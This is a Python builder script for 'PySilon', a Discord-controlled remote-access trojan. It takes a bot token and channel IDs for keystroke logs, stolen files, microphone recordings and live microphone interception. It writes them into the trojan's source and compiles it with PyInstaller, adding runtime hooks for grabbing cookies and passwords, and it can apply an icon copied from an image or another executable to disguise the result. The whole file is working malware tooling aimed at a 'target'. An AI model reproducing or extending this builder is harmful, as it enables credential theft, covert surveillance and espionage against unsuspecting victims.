import os
import sys
import hashlib
from tkinter import Tk, filedialog

def get_file_hash(path):
    sha256_hash = hashlib.sha256()
    with open(path,"rb") as f:
        for byte_block in iter(lambda: f.read(16777216),b""):
            sha256_hash.update(byte_block)
        return sha256_hash.hexdigest()

def get_file_path():
    root = Tk()
    root.withdraw()
    root.attributes('-topmost', True)
    open_dir = filedialog.askopenfilename(filetypes=[('Image files', '.jpg .png'), ('Copy from other executable', '.exe')])
    root.destroy()
    return open_dir

settings = []
icon_path = ''
settings_prompts = [
    'Main channel ID: ',
    'Spam channel ID: ',
    'File channel ID: ',
    'Recordings channel ID: ',
    'Voice channel ID: ',
    'Discord BOT token: ',
    'Software registry name: ',
    'Software directory name (default -> REGISTRY_NAME): ',
    'Software executable name (default -> DIRECTORY_NAME + .exe): '
]

for setting in settings_prompts:
    settings.append(input(setting))

if input('Would you like to set a custom icon to compiled executable? Y/n ').lower() == 'y':
    icon_path = get_file_path()

pyinstaller_command = 'start cmd /k "title Building file...' + ' '*240 + '& python PyInstaller/__main__.py -F ' + '--runtime-hook=resources/misc.py --runtime-hook=resources/get_cookies.py --runtime-hook=resources/passwords_grabber.py ' + (('--icon "' + icon_path + '" ') if icon_path != '' else '') + '"main_prepared.py" & echo - & echo.Done & echo.- & pause & exit"'

with open('PySilon.key', 'wb') as save_key: save_key.write(os.urandom(1024*1024))
with open('main.py', 'r') as copy_source_code: source_code = copy_source_code.readlines()
with open('main_prepared.py', 'w') as edit_source_code:
    for line in range(len(source_code)):
        match line:
            case 46: edit_source_code.write('bot_token = \'' + settings[5] + '\'   # Paste here BOT-token\n')
            case 47: edit_source_code.write('software_registry_name = \'' + settings[6] + '\'   # --- Software name shown in registry\n')
            case 48: edit_source_code.write('software_directory_name = \'' + settings[7] + '\'   # --- Directory (containing software executable) located in "C:\Program Files"\n')
            case 49: edit_source_code.write('software_executable_name = \'' + settings[8] + '\'   # --- Software executable name\n')
            case 52: edit_source_code.write('    \'main\': ' + settings[0] + ',   # Paste here main channel ID for general output\n')
            case 53: edit_source_code.write('    \'spam\': ' + settings[1] + ',   # Paste here spam channel ID for filter key spamming (mostly while target play game)\n')
            case 54: edit_source_code.write('    \'file\': ' + settings[2] + ',   # Paste here file-related channel ID for browsing, downloading and uploading files\n')
            case 55: edit_source_code.write('    \'recordings\': ' + settings[3] + ',   # Paste here recording channel ID for microphone recordings storing\n')
            case 56: edit_source_code.write('    \'voice\': ' + settings[4] + '   # Paste here voice channel ID for realtime microphone intercepting\n')
            case 59: edit_source_code.write('secret_key = \'' + get_file_hash('PySilon.key') + '\'   # Don\'t touch this line (just leave)\n')
            case _: edit_source_code.write(source_code[line])

os.system(pyinstaller_command)
input('Press ENTER after processing ends in second window...')
